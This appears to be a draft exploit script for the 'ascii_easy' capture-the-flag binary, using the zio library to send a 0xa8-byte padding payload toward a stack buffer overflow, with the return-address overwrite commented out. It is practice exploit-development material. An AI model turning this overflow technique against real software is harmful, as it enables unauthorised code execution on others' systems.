from zio import *
target = "./ascii_easy"
def get_io(target):
	read_mode = COLORED(RAW, "green")
	write_mode = COLORED(RAW, "blue")
	io = zio(target, timeout = 9999)#, print_read = read_mode, print_write = write_mode)
	return io

def pwn(io):	
	#io.interact()
	#io.read_until(":")
	io.gdb_hint()
	ebp = 'a' * 4
	ret = l32(0x80000000)
	payload = 'a' * 0xa8# + ebp + ret
	io.write(payload + "\n")
	io.interact()

io = get_io(target)
pwn(io)